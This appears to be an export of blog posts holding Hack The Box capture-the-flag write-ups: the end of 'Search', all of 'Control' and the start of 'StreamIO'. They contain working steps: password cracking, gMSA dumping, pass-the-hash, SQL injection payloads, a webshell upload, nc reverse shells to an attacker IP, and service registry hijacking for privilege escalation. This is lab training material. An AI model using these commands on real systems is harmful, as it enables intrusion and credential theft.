previously downloaded two certificate files from sierra through SMB, staff.pfx and search-RESEARCH-CA.p12.\nThe PKCS#12 or PFX format is a binary format for storing the server certificate, intermediate certificates, and the private key in one encryptable file. PFX files usually have extensions such as .pfx and .p12. PFX files are typically used on Windows machines to import and export certificates and private keys.\nTo import the .pfx or .p12 files into Firefox we need to find its respective password. There are tools that can help us with this process, eg. pfx2john.\n┌──(void㉿void)-[/htb/search]\n└─$ /usr/share/john/pfx2john.py smb-loot/staff.pfx | john --wordlist=/usr/share/wordlists/rockyou.txt /dev/stdin                                          1 ⨯\nUsing default input encoding: UTF-8\nLoaded 1 password hash (pfx [PKCS12 PBE (.pfx, .p12) (SHA-1 to SHA-512) 256/256 AVX2 8x])\nCost 1 (iteration count) is 2000 for all loaded hashes\nCost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n\nmisspissy        (staff.pfx)\n1g 0:00:02:33 DONE (2022-01-04 15:11)\nOr if you’re super hipster and want to wait for a few hours, you can also run the loops below.\n┌──(void㉿void)-[/htb/search/smb-loot]\n└─$ cat /usr/share/wordlists/rockyou.txt | while read p; do echo Trying: $p; openssl pkcs12 -in staff.pfx -passin pass:$p; RC=$?; if [ $RC -eq 0 ]; then break; fi; done\n\n[... snip ...]\n\nTrying: 123\nMac verify error: invalid password?\nTrying: misspissy\nBag Attributes\n    localKeyID: 01 00 00 00 \n    Microsoft CSP Name: Microsoft Enhanced Cryptographic Provider v1.0\n    friendlyName: te-ITSecOps-42ad83c7-07ac-4daa-b273-be11dd691da5\nKey Attributes\n    X509v3 Key Usage: 10 \nEnter PEM pass phrase:\nImport the certificate to Firefox, clear the Cookies and Site Data, and we should now be able to reach https://search.htb/staff.\n\n\n\nStep 2\nWe previously found that users in the group ITSec also are a part of the group Remote Management Users, giving us two options. 1. ITSec user Sierra.Frye (password: $$49=wide=STRAIGHT=jordan=28$$18) 2. ITSec user Abby.Gonzalez (password: &&75:major:RADIO:state:93&&) ![[Pasted image 20220104154915.png]]\nLooking in Bloodhound we can clearly see the option how to pwn the domain, from left to right. Both Abby and Sierra can login to research.search.htb (CanPsRemote), through https://search.htb/staff, and from there we should be able to dump the GMSA hash (since group ITSec have ReadGMSAPassword to account BIR-ADFS-GMSA that we saw in Method 1). ![[Pasted image 20220105073905.png]]\nPS C:\\Users\\Sierra.Frye\\Documents&gt; $gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'\nPS C:\\Users\\Sierra.Frye\\Documents&gt; $mp = ConvertFrom-ADManagedPasswordBlob $gmsa.'msDS-ManagedPassword'\nPS C:\\Users\\Sierra.Frye\\Documents&gt; $mp\n\nVersion                   : 1\nCurrentPassword           : ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑᳡扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾେ͍롤\n                            ᒛ�䬁ማ譿녓鏶᪺骲雰騆惿閴滭䶙竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱茾蒚⟒澽座걍盡篇\nSecureCurrentPassword     : System.Security.SecureString\nPreviousPassword          : \nSecurePreviousPassword    : \nQueryPasswordInterval     : 3013.16:52:19.9664471\nUnchangedPasswordInterval : 3013.16:47:19.9664471\n\nPS C:\\Users\\Sierra.Frye\\Documents&gt; ConvertTo-NTHash $mp.SecureCurrentPassword\ne1e9fd9e46d0d747e1595167eedcec0f\n\n\n\n      PS C:\\Users\\Sierra.Frye\\Documents&gt; $user = 'control.htb\\hector'\n      PS C:\\Users\\Sierra.Frye\\Documents&gt; $creds = New-Object System.Management.Automation.PSCredential($user,$mp.SecureCurrentPassword)\n      PS C:\\Users\\Sierra.Frye\\Documents&gt; Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { whoami }\n\n\n\nStep 3\nPass-the-Hash as BIR-ADFS-GMSA$ over rpcclient, change password to tristan.davies and grab root.\n┌──(void㉿void)-[/htb/search]\n└─$ pth-rpcclient -U search.htb/BIR-ADFS-GMSA$%00000000000000000000000000000000:e1e9fd9e46d0d747e1595167eedcec0f //10.10.11.129\nE_md4hash wrapper called.\nHASH PASS: Substituting user supplied NTLM HASH...\nrpcclient $&gt; setuserinfo2 tristan.davies 23 ASDqwe123!\n\n┌──(void㉿void)-[/htb/search]\n└─$ crackmapexec smb 10.10.11.129 -u tristan.davies -p ASDqwe123! -x 'type C:\\Users\\Administrator\\Desktop\\root.txt'\nSMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.129    445    RESEARCH         [+] search.htb\\tristan.davies:ASDqwe123! (Pwn3d!)\nSMB         10.10.11.129    445    RESEARCH         [+] Executed command \nSMB         10.10.11.129    445    RESEARCH         8ffdc3acd86000b9eb7ace10e0c0462a\n\n\n\n\nReferences\nReadGMSAPassword: https://www.thehacker.recipes/ad/movement/access-controls/readgmsapassword https://stealthbits.com/blog/securing-gmsa-passwords/\ngMSADumper: https://github.com/micahvandeusen/gMSADumper\nPass-the-Hash attacks: https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/\nrpcclient - change ad password: https://malicious.link/post/2017/reset-ad-user-password-with-linux/\nbash return code (RC=$?): https://www.toolbox.com/tech/programming/question/help-with-rc-03310"
  },
  {
    "objectID": "posts/2020-01-16-htb-writeup-control/2020-01-16-htb-writeup-control.html",
    "href": "posts/2020-01-16-htb-writeup-control/2020-01-16-htb-writeup-control.html",
    "title": "Control - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@p3:/opt/htb/machines/control# nmapAutomatorDirb.sh 10.10.10.167 All PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |http-title: Fidelity 135/tcp open msrpc Microsoft Windows RPC 3306/tcp open mysql? | fingerprint-strings: | NULL: | Host ‘10.10.14.3’ is not allowed to connect to this MariaDB server 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows Database: MariaDB\n\nhttp://10.10.10.167:80/about.php (CODE:200|SIZE:7867)\nhttp://10.10.10.167:80/admin.php (CODE:200|SIZE:89)\nhttp://10.10.10.167:80/database.php (CODE:200|SIZE:0)\nhttp://10.10.10.167:80/index.php (CODE:200|SIZE:3145)\nOSVDB-3092: /license.txt: License file found may identify site software.\n\nOn the website we find a ‘To Do’-list commented in the code, giving us the location of SSL Certificates, also hinting of a payment system. To Do:\n\nImport Products\nLink to new payment system\nEnable SSL (Certificates location \\192.168.4.28)\n\nhttp://control.htb/admin.php is Denied, we need to do this through a proxy. http://control.htb/database.php is a blank page\nrpcclient without a user doesn’t work - Error was NT_STATUS_IO_TIMEOUT mysql without a user doesn’t work - Host ‘10.10.14.3’ is not allowed to connect to this MariaDB server\nAs stated on admin.php a header option is missing. Adding this up with that they have the SSL Certs on 192.168.4.28/myfiles it would make sense that that IP belongs to an admin. We can forge the HTTP GET Request to make it look like it was forwarded from that IP using the header X-Forwarded-From: IP-ADDRESS option.\nBurp Repeater: GET /admin.php HTTP/1.1 Host: control.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://control.htb/ Connection: close Upgrade-Insecure-Requests: 1 X-Forwarded-For: 192.168.4.28\nVia CURL: root@p3:/opt/htb/machines/control# curl -H “X-Forwarded-For: 192.168.4.28” -v “http://control.htb/admin.php”\nOr using the Mozilla Firefox addon - HTTP Header Live to modify your requests in real time.\nOn the admin-site we find a few new URLs, search_products.php, create_product.php and create_category.php. Being able to request directly in to the database (MariaDB) sounds promising, maybe we can get a shell from here.\nInvestigating further and we find view_product.php, and within function.js.\nfunction viewProduct(id) { document.getElementById(“productId”).value = id; document.forms[“viewProducts”].action = “view_product.php”; document.forms[“viewProducts”].submit(); }\nHere we have a input variable called productId. Trying to inject data to it, it seems to be vulnerable to SQLi (error 500).\nRequest, productId=1: POST /view_product.php HTTP/1.1 Host: control.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Content-Type: application/x-www-form-urlencoded Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Content-Length: 11\nproductId=1\nResponse, productId=1: HTTP/1.1 200 OK Content-Type: text/html; charset=UTF-8 Server: Microsoft-IIS/10.0 X-Powered-By: PHP/7.3.7 Date: Wed, 15 Jan 2020 13:15:50 GMT Connection: close Content-Length: 2083\nRequest, productId=’: POST /view_product.php HTTP/1.1 Host: control.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Content-Type: application/x-www-form-urlencoded Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Content-Length: 11\nproductId=’\nResponse, productId=’: HTTP/1.1 500 Internal Server Error Content-Type: text/html; charset=UTF-8 Server: Microsoft-IIS/10.0 X-Powered-By: PHP/7.3.7 Date: Wed, 15 Jan 2020 13:17:20 GMT Connection: close Content-Length: 1339\nNow we can either enumerate the db manually, or use sqlmap. I’ve tried both methods following the guide linked in “Information”, however using sqlmap is far quicker.\nroot@p3:~/Documents/TelenorCPE# sqlmap -u http://control.htb/view_product.php –data productId=1 –current-user –current-db –passwords –tables .. [14:09:40] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL &gt;= 5.0.12 [14:09:40] [INFO] fetching current user current user: ‘manager@localhost’ [14:09:40] [INFO] fetching current database current database: ‘warehouse’ [14:09:40] [INFO] fetching database users password hashes database management system users password hashes: [*] hector [1]: password hash: 0E178792E8FC304A2E3133D535D38CAF1DA3CD9D [*] manager [1]: password hash: CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA [*] root [1]: password hash: *0A4A5CAD344718DC418035A1F4D292BA603134D8\nAdd the hashes to a file and crack them using hashcat. root@p3:/opt/htb/machines/control# hashcat -a0 -m300 hashes.txt /usr/share/wordlists/rockyou.txt -o -hashes-cracked.txt root@p3:/opt/htb/machines/control# cat ./-hashes-cracked.txt 0e178792e8fc304a2e3133d535d38caf1da3cd9d:l33th4x0rhector cfe3eee434b38cbf709ad67a4dcdea476cba7fda:l3tm3!n\nWe find the credentials for hector:l33th4x0rhector and manager:l3tm3!n\nNOTE: l3tm3!n is not normally part of rockyou.txt, I found this hash when cracking via sqlmap and crackstation.net, and then added it to my rockyou.txt\nWe have now enumerated thoroughly and two sets of credentials. Using sqlmap we can upload files to the remote host, however we don’t fully know the root directory of the webserver. Googling this we find that the default web root directories for windows are c:, c:, and/or c:.\nUpload a webshell to one of the directories to see if the victim use a default file structure.\nroot@p3:/opt/powercat# sqlmap -u http://control.htb/view_product.php –data productId=1 –file-write=“/opt/shells/webshell.php” –file-dest=“C:/inetpub/wwwroot/p3.php” .. [14:24:21] [INFO] the local file ‘/opt/shells/webshell.php’ and the remote file ‘C:/inetpub/wwwroot/upload.php’ have the same size (7206 B)\nUpload was successfull and we can confirm that C:/inetpub/wwwroot/ is the correct directory. We can now reach the webshell; http://control.htb/upload.php\nJust like the box Sniper we setup a reverse shell using nc64.exe on our local smb share (pub-share).\nWebshell: //10.10.14.3/pub-share/nc64.exe 10.10.14.3 4488 -e powershell\nroot@p3:/opt# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.3] from (UNKNOWN) [10.10.10.167] 51674 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.\nPS C:&gt; whoami nt authority PS C:&gt; whoami /priv Privilege Name Description State ======================= ========================================= ======= SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled\nWith the privileges we can execute commands as user Hector, including setting up a new reverse shell with escalated privs.\nAssign Hectors credentials: PS C:&gt; $user = ‘control.htb’ PS C:&gt; $pass = ‘l33th4x0rhector’ | ConvertTo-SecureString -AsPlainText -Force PS C:&gt; \\(creds = New-Object System.Management.Automation.PSCredential(\\)user,$pass)\nTest to make sure it works by executing a command: PS C:&gt; Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { whoami } control\nSetup a new reverse shell: PS C:&gt; Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { //10.10.14.3/pub-share/nc64.exe 10.10.14.3 4499 -e powershell }\nroot@p3:/opt/htb/machines/control# nc -lvnp 4499 listening on [any] 4499 … connect to [10.10.14.3] from (UNKNOWN) [10.10.10.167] 51686 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.\nPS C:&gt; whoami control PS C:&gt; type C:.txt d878****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nGeneral enumeration gives us close to nothing. Looking at the PS History of user Hector we find something interesting to follow\nPS C:&gt; type C:_history.txt get-childitem HKLM:| format-list get-acl HKLM:| format-list\nThe PS History hints us towards the Registry, so lets look if there are any vulnerable services using AccessChk.exe\nPS C:&gt; ..exe “hector” -kvuqsw hklm\nAccesschk v6.12 - Reports effective permissions for securable objects Copyright (C) 2006-2017 Mark Russinovich Sysinternals - www.sysinternals.com\nRW HKLM.NET CLR Data KEY_ALL_ACCESS ..\nWe get hundreds of lines of output, all saying that all services are writeable with “KEY_ALL_ACCESS” permissions.\nWe need a way to filter the output, giving us the attack vector. We do this in 3 steps.\n\n\nList all Services in a .txt. The -kw flags list registry key (-k) and only writable services (-w) PS C:&gt; ..exe “hector” -kw hklm&gt; \\10.10.14.11-share.txt\nQuery all services to see which service we are allowed. Sort the allowed services in a list. PS C:&gt; sc.exe qc applockerfltr\nStart all the allowed services from step B, filter the services that we are allowed to start. We now have our attack vector(s) PS C:&gt; sc.exe start NetSetupSvc\n\n\nWe now have a list of vulnerable services that we can exploit. The next steps are time sensitive so we need to be quick. Start by changing the binpath of a vulnerable service to do whatever you like, I chose to setup a reverse shell. PS C:&gt; reg add “HKEY_LOCAL_MACHINE” /t REG_EXPAND_SZ /v ImagePath /d “C:64.exe 10.10.14.11 4400 -e powershell” /f\nConfirm that the path has been changed. PS C:&gt; reg query “HKLM” /v “ImagePath”\nHKEY_LOCAL_MACHINE ImagePath REG_EXPAND_SZ C:64.exe 10.10.14.11 4400 -e powershell\nStart the service and receive your reverse shell. Grab flag before the service fails. PS C:&gt; sc.exe start NetSetupSvc root@p3:/opt/htb/machines/control# nc -lnvp 4400 listening on [any] 4400 … connect to [10.10.14.11] from (UNKNOWN) [10.10.10.167] 49903 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.\nPS C:&gt; whoami nt authority PS C:&gt; type root.txt 8f86****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nX-Forwarded-For https://en.wikipedia.org/wiki/X-Forwarded-For\nSQLi https://medium.com/@Kan1shka9/pentesterlab-from-sql-injection-to-shell-walkthrough-7b70cd540bc8 https://resources.infosecinstitute.com/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/#gref\nSecList - Web, Root Directory https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt\nPrivesc Windows Registry https://medium.com/@shy327o/windows-privilege-escalation-insecure-service-1-ec4c428e4800 https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ https://www.fuzzysecurity.com/tutorials/16.html ```"
  },
  {
    "objectID": "posts/2019-04-20-htb-writeup-teacher/2019-04-20-htb-writeup-teacher.html",
    "href": "posts/2019-04-20-htb-writeup-teacher/2019-04-20-htb-writeup-teacher.html",
    "title": "Teacher - Hack The Box",
    "section": "",
    "text": "No writeup available.."
  },
  {
    "objectID": "posts/2019-06-24-htb-writeup-lacasadepapel/2019-06-24-htb-writeup-lacasadepapel.html",
    "href": "posts/2019-06-24-htb-writeup-lacasadepapel/2019-06-24-htb-writeup-lacasadepapel.html",
    "title": "Lacasadepapel - Hack The Box",
    "section": "",
    "text": "No writeup available.."
  },
  {
    "objectID": "posts/2022-08-03-htb-writeup-streamio/2022-08-03-htb-writeup-streamio.html",
    "href": "posts/2022-08-03-htb-writeup-streamio/2022-08-03-htb-writeup-streamio.html",
    "title": "StreamIO - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\nnmap:\n➜  streamio nmap -Pn -n -p- -v 10.10.11.158\nPORT   STATE SERVICE\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n443/tcp   open  https\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49667/tcp open  unknown\n49673/tcp open  unknown\n49674/tcp open  unknown\n49701/tcp open  unknown\n50436/tcp open  unknown\n\n\n➜  streamio nmap -Pn -n -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49701,50436 -sCV 10.10.11.158   \nPORT   STATE SERVICE VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: IIS Windows Server\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-28 15:05:15Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)\n443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n| ssl-cert: Subject: commonName=streamIO/countryName=EU\n| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb\n| Not valid before: 2022-02-22T07:03:28\n|_Not valid after:  2022-03-24T07:03:28\n|_ssl-date: 2022-06-28T15:06:45+00:00; +7h00m00s from scanner time.\n| tls-alpn: \n|_  http/1.1\n|_http-title: Not Found\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc         Microsoft Windows RPC\n49701/tcp open  msrpc         Microsoft Windows RPC\n50436/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\n\n\n➜  streamio sudo nmap -sU -v 10.10.11.158 -Pn --top-port=100\nPORT    STATE SERVICE\n53/udp  open  domain\n123/udp open  ntp\n\nDomain: streamIO.htb\nVhost: watch.streamIO.htb\n\nGoing through the website, https://streamio.htb, we find an email address in the footer - oliver@streamio.htb. In the “about us” section we find two more users, Barry and Samantha.\nFFUF:\n➜  streamio ffuf -c -w /usr/share/wordlists/dirb/big.txt -u https://streamio.htb/FUZZ \n[... snip ...]\nADMIN                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 31ms]\nAdmin                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 29ms]\nImages                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 29ms]\nadmin                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 28ms]\ncss                     [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 29ms]\nfavicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 29ms]\nfonts                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 33ms]\nimages                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 28ms]\njs                      [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 30ms]\n\n➜  streamio ffuf -c -w /usr/share/wordlists/dirb/big.txt -u https://streamio.htb/admin/FUZZ.php\n[... snip ...]\nIndex                   [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 33ms]\nindex                   [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 32ms]\nmaster                  [Status: 200, Size: 58, Words: 5, Lines: 2, Duration: 40ms]\n➜  streamio curl -k https://streamio.htb/admin/master.php\n&lt;h1&gt;Movie managment&lt;/h1&gt;\nOnly accessable through includes%\nMaybe we’ll find a include parameter which we controll, and can call https://streamio.htb/admin/master.php ?\nWe can’t bypass the 403 to access any admin-page. The signup function of the site doesn’t seem to do anything, we can “create” an account but can’t login with it. The signup nor the login is vulnerable to sqli. Move on to the vhost, watch.streamio.htb.\n➜  streamio ffuf -c -w /usr/share/wordlists/dirb/big.txt -u https://watch.streamio.htb/FUZZ.php               \n[... snip ...]\nIndex                   [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 33ms]\nSearch                  [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 88ms]\nblocked                 [Status: 200, Size: 677, Words: 28, Lines: 20, Duration: 32ms]\nindex                   [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 36ms]\nsearch                  [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 50ms]\nAt https://watch.streamio.htb/search.php we find all of the movies, however we are met with an error when trying to watch any of them.\nWe have a lot of different input fields and it would be wise to test SQLi on .. .. login at streamio.htb/login.php .. email subscription at watch.streamio.htb .. search at watch.streamio.htb/search.php\n## LOGIN\n➜  streamio sqlmap -r req-login.txt --dbs --threads 5 --force-ssl\n[... snip ...]\n[11:52:15] [INFO] (custom) POST parameter '#1*' appears to be 'Microsoft SQL Server/Sybase stacked queries (comment)' injectable \nsqlmap identified the following injection point(s) with a total of 66 HTTP(s) requests:\n---\nParameter: #1* ((custom) POST)\n    Type: stacked queries\n    Title: Microsoft SQL Server/Sybase stacked queries (comment)\n    Payload: username=';WAITFOR DELAY '0:0:5'--&password=asdf'\n---\navailable databases [5]:\n[*] model\n[*] msdb\n[*] STREAMIO\n[*] streamio_backup\n[*] tempdb\n\n## EMAIL\n➜  streamio sqlmap -r req-email.txt --dbs --threads 5 --force-ssl\n[... snip ...]\n[11:59:45] [CRITICAL] all tested parameters do not appear to be injectable.]\n\n## SEARCH\n➜  streamio sqlmap -r req-search.txt --dbs --threads 5 --force-ssl\n[... snip ...]\n[12:01:57] [CRITICAL] all tested parameters do not appear to be injectable.\n\n\nStep 2\nWe have a timed injection in the username parameter of the login page. Continue to enumerate tables of database STREAMIO.\n➜  streamio sqlmap -r req-login.txt -D STREAMIO --tables --force-ssl\n[... snip ...]\n[12:11:46] [INFO] retrieved: dbo.movies\n[12:11:46] [INFO] retrieved: dbo.users\nDatabase: STREAMIO\n[2 tables]\n+--------+\n| movies |\n| users  |\n+--------+\n\n➜  streamio sqlmap -r req-login.txt -D STREAMIO -T dbo.users --dump --force-ssl\n[... snip ...]\n[12:14:05] [INFO] retrieved: is_staff\n[12:14:47] [INFO] retrieved: password\n[12:15:29] [INFO] retrieved: username\n\n+----+----------+----------------------------------------------------+----------------------------------------------------+\n| id | is_staff | password                                           | username                                           |\n+----+----------+----------------------------------------------------+----------------------------------------------------+\n| 3  | 1        | c660060492d9edcaa8332d89c99c9239                   | James                                              |\n| 4  | 1        | 925e5408ecb67aea449373d668b7359e                   | Theodore                                           |\n| 5  | 1        | 083ffae904143c4796e464dac33c1f7d                   | Samantha                                           |\n| 6  | 1        | 08344b85b329d7efd611b7a7743e8a09                   | Lauren                                             |\n| 7  | 1        | d62be0dc82071bccc1322d64ec5b6c51                   | William                                            |\n| 8  | 1        | f87d3c0d6c8fd686aacc6627f1f493a5                   | Sabrina                                            |\n| 9  | 1        | f03b910e2bd0313a23fdd7575f34a694                   | Robert                                             |\n| 10 | 1        | 3577c47eb1e12c8ba021611e1280753c                   | Thane                                              |\n+----+----------+----------------------------------------------------+----------------------------------------------------+\n\nLAUREN = 08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##\nSABRINA = f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$ \nThe dump is time-based which takes ages, so after about two hours I stop sqlmap and look for other ways in. Of the 10 hashes collected we’re able to crack two - however they don’t lead to anything.\nShifting focus to watch.streamio.htb/search.php I notice that the user input isn’t parameterized. If I search for 1 I get all movies containing 1, however if I search for 1';-- - I only get all movies ENDING with 1, and they are sorted by release date.\nWith that information I assume the original query is something like this:\n## ASSUMED ORIGINAL QUERY\nSELECT Name, ReleaseDate FROM STREAMIO.movies\nWHERE Name = 'INPUT-DATA'\nORDER BY Name ASC;\nPlaying around with SQLi and UNION SELECT @@version we can ennumerate the number of columns, example:\n' UNION SELECT @@version\n' UNION SELECT @@version,2\n' UNION SELECT 1,@@version\n' UNION SELECT @@version,2,3\n' UNION SELECT 1,@@version,3\n' UNION SELECT 1,2,@@version\n...\nAt 6 columns we get the response we’re looking for:\n## REQUEST\nq=1' UNION SELECT 1,@@version,3,4,5,6;-- -\n\n'## RESPONSE\nMicrosoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) \n    Sep 24 2019 13:48:23 \n    Copyright (C) 2019 Microsoft Corporation\n    Express Edition (64-bit) on Windows Server 2019 Standard 10.0 &lt;X64&gt; (Build 17763: ) (Hypervisor)\nWith this injection, and previously known database information, we are now able to extract the entire user database.\n### REQUEST\nPOST /search.php HTTP/2\nHost: watch.streamio.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 77\nOrigin: https://watch.streamio.htb\nReferer: https://watch.streamio.htb/search.php\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nTe: trailers\n\nq=1' UNION SELECT 1,concat(username,':',password),3,4,5,6 from dbo.users;-- -\nCopy the output to a file, and with some bash magic we can make a list of all users and it’s corresponding hash.\n➜  streamio cat sqli-out.txt| awk -F \" \" '{print $2,$3}' | cut -d'&gt;' -f2 | sort -u | grep \" :\" | sed 's/ 